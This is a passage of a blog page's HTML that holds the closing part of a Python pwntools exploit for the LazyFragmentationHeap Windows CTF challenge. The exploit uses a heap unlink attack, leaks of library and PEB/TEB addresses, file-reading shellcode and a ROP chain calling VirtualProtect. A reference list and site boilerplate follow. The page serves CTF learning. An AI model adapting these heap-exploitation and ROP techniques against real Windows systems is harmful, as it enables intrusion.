<span class="comment"># return address of printf</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                address -= <span class="number">8</span></span><br><span class="line">        <span class="keyword">assert</span>(address !=self.stack_end - <span class="number">0x1000</span>)</span><br><span class="line">        <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_shellcode</span><span class="params">(self)</span>:</span></span><br><span class="line">        _open = self.ucrtbase + <span class="number">0xA5550</span></span><br><span class="line">        _read = self.ucrtbase + <span class="number">0x182A0</span></span><br><span class="line">        _write = self.ucrtbase + <span class="number">0x17BA0</span></span><br><span class="line">        _exit = self.ucrtbase + <span class="number">0x74630</span></span><br><span class="line">        filename = self.text_base + <span class="number">0x5400</span> <span class="comment"># .data segment</span></span><br><span class="line">        buffer = self.text_base + <span class="number">0x5450</span> <span class="comment"># .data segment</span></span><br><span class="line">        shellcode_addr = self.text_base + <span class="number">0x5500</span> <span class="comment"># .data segment</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># args: rcx, rdx, r8, r9, (stack)</span></span><br><span class="line">        shellcode = <span class="string">r'''</span></span><br><span class="line"><span class="string">        open_file:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x  </span></span><br><span class="line"><span class="string">            mov rcx, 0x%x  </span></span><br><span class="line"><span class="string">            mov rdx, 0     </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        read_file:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x </span></span><br><span class="line"><span class="string">            mov rcx, rax   </span></span><br><span class="line"><span class="string">            mov rdx, 0x%x  </span></span><br><span class="line"><span class="string">            mov r8, 0x30   </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        write_file:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x </span></span><br><span class="line"><span class="string">            mov rcx, 1     </span></span><br><span class="line"><span class="string">            mov rdx, 0x%x  </span></span><br><span class="line"><span class="string">            mov r8, 0x30   </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        exit:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x </span></span><br><span class="line"><span class="string">            mov rdx, 1    </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string">        '''</span> % (_open, filename, _read, buffer, _write, buffer, _exit)\</span><br><span class="line"></span><br><span class="line">        self.arbitrary_write(shellcode_addr, asm(shellcode))</span><br><span class="line">        self.arbitrary_write(filename, <span class="string">"./flag.txt"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_rop</span><span class="params">(self)</span>:</span></span><br><span class="line">        data_segment = self.text_base + <span class="number">0x5000</span></span><br><span class="line">        shellcode_addr = data_segment + <span class="number">0x500</span></span><br><span class="line">        VirtualProtect = self.kernel32 + <span class="number">0x1BC70</span></span><br><span class="line">        pop_rcx_r8_r9_r10_r11 = self.ntdll + <span class="number">0x8c551</span> <span class="comment"># pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret</span></span><br><span class="line">        pop_rdx_r11 = self.ntdll + <span class="number">0x8C557</span> <span class="comment"># pop rdx ; pop r11 ; ret</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># jmp shellcode</span></span><br><span class="line">        payload = p64(pop_rcx_r8_r9_r10_r11)</span><br><span class="line">        payload += p64(data_segment) + p64(<span class="number">0x40</span>) + p64(data_segment + <span class="number">0xA00</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 0x40 is PAGE_EXECUTE_READWRITE</span></span><br><span class="line">        payload += p64(pop_rdx_r11)</span><br><span class="line">        payload += p64(<span class="number">0x1000</span>) + p64(<span class="number">0</span>)</span><br><span class="line">        payload += p64(VirtualProtect)</span><br><span class="line">        payload += p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # system("cmd.exe") doesn't work, since LFH has broken</span></span><br><span class="line">        <span class="comment"># system = self.ucrtbase + 0xAE5C0</span></span><br><span class="line">        <span class="comment"># payload = p64(pop_rcx_r8_r9_r10_r11)</span></span><br><span class="line">        <span class="comment"># payload += p64(self.ret_address_in_stack + 0x40) + p64(0) + p64(0) + p64(0) + p64(0)</span></span><br><span class="line">        <span class="comment"># payload += p64(pop_rdx_r11 + 3)</span></span><br><span class="line">        <span class="comment"># payload += p64(system)</span></span><br><span class="line">        <span class="comment"># payload += "cmd.exe\x00"</span></span><br><span class="line"></span><br><span class="line">        self.arbitrary_write(self.ret_address_in_stack, payload, final_write=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.write_pioinfo()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># let chunk 5 points to itself</span></span><br><span class="line">        self.unlink_attack() </span><br><span class="line"></span><br><span class="line">        payload = <span class="string">"A"</span> * <span class="number">0x8</span> </span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">6</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>)</span><br><span class="line">        self.edit(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># do arbitrary read and write</span></span><br><span class="line">        self.kernel32 = self.arbitrary_read(self.text_base + <span class="number">0x3028</span>) - <span class="number">0x24890</span> <span class="comment"># GetCurrentProcessId_iat in binary</span></span><br><span class="line">        self.ntdll = self.arbitrary_read(self.kernel32 + <span class="number">0x82888</span>) - <span class="number">0x8CBC0</span> <span class="comment"># atol_iat in kernel32</span></span><br><span class="line">        self.PEB = self.arbitrary_read(self.ntdll + <span class="number">0x16A448</span>) - <span class="number">0x80</span> <span class="comment"># ntdll!PebLdr - 0x78</span></span><br><span class="line">        self.TEB = self.PEB + <span class="number">0x1000</span></span><br><span class="line">        self.stack_end = (self.arbitrary_read(self.TEB + <span class="number">0x11</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x3000</span> </span><br><span class="line"></span><br><span class="line">        <span class="comment"># find where return address lies</span></span><br><span class="line">        self.ret_address_in_stack = self.search_ret_addr()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write shellcode</span></span><br><span class="line">        self.write_shellcode()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write ROP</span></span><br><span class="line">        self.debug()</span><br><span class="line">        self.write_rop()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_info</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] encoding is: %s "</span> % hex(self.encoding))</span><br><span class="line">        print(<span class="string">"[+] heap_base is: %s "</span> % hex(self.heap_addr))</span><br><span class="line">        print(<span class="string">"[+] text_base is: %s "</span> % hex(self.text_base))</span><br><span class="line">        print(<span class="string">"[+] ucrtbase is: %s "</span> % hex(self.ucrtbase))</span><br><span class="line">        print(<span class="string">"[+] pioinfo[0] offset is: %s "</span> % hex(self.pioinfo_offset))</span><br><span class="line">        print(<span class="string">"[+] kernel32 is: %s "</span> % hex(self.kernel32))</span><br><span class="line">        print(<span class="string">"[+] ntdll is: %s "</span> % hex(self.ntdll))</span><br><span class="line">        print(<span class="string">"[+] PEB is: %s "</span> % hex(self.PEB))</span><br><span class="line">        print(<span class="string">"[+] TEB is: %s "</span> % hex(self.TEB))</span><br><span class="line">        print(<span class="string">"[+] stack_end is: %s "</span> % hex(self.stack_end))</span><br><span class="line">        print(<span class="string">"[+] ret_address_in_stack is: %s "</span> % hex(self.ret_address_in_stack))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    attack = Attack()</span><br><span class="line">    attack.run()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html" target="_blank" rel="noopener">https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html</a></li>
<li><a href="https://bbs.pediy.com/thread-221016.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-221016.htm</a></li>
<li><a href="http://www.jbox.dk/sanos/source/win32/msvcrt/except.c.html" target="_blank" rel="noopener">http://www.jbox.dk/sanos/source/win32/msvcrt/except.c.html</a></li>
<li><a href="https://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup" target="_blank" rel="noopener">https://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup</a></li>
<li><a href="https://www.anquanke.com/post/id/188170" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188170</a></li>
<li><a href="https://www.anquanke.com/post/id/188170#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188170#h3-4</a></li>
<li><a href="https://www.cnblogs.com/lanrenxinxin/p/4631836.html" target="_blank" rel="noopener">https://www.cnblogs.com/lanrenxinxin/p/4631836.html</a></li>
<li><a href="https://b0ldfrev.gitbook.io/note/windows_operating_system/windowsseh-li-yong" target="_blank" rel="noopener">https://b0ldfrev.gitbook.io/note/windows_operating_system/windowsseh-li-yong</a></li>
<li><a href="http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf" target="_blank" rel="noopener">http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf</a></li>
<li><a href="https://xz.aliyun.com/t/2587" target="_blank" rel="noopener">https://xz.aliyun.com/t/2587</a></li>
<li><a href="https://github.com/scwuaptx/LazyFragmentationHeap" target="_blank" rel="noopener">https://github.com/scwuaptx/LazyFragmentationHeap</a></li>
<li><a href="http://blog.eonew.cn/archives/1253#more-1253" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1253#more-1253</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Nop</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://n0nop.com/2021/04/20/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-Windows-Pwn/">https://n0nop.com/2021/04/20/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-Windows-Pwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/09/20/%E4%BB%8EWMCTF-winpwn%E4%B8%AD%E5%AD%A6%E4%B9%A0Segment-Heap/"><i class="fa fa-chevron-left">  </i><span>从WMCTF winpwn中学习Segment Heap</span></a></div><div class="next-post pull-right"><a href="/2021/04/15/Learning-Windows-pwn-Nt-Heap/"><span>Learning Windows pwn -- Nt Heap</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == 'true';
var verify = 'false' == 'true';
var record_ip = 'false' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'r5Gkikl9GU9Oux3XiRu5Xtel-MdYXbMMI',
  appKey:'zSDYDqmNTxhb5QxupwDuYOxQ',
  placeholder:'......',
  avatar:'',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://n0nop.com/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By Nop</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>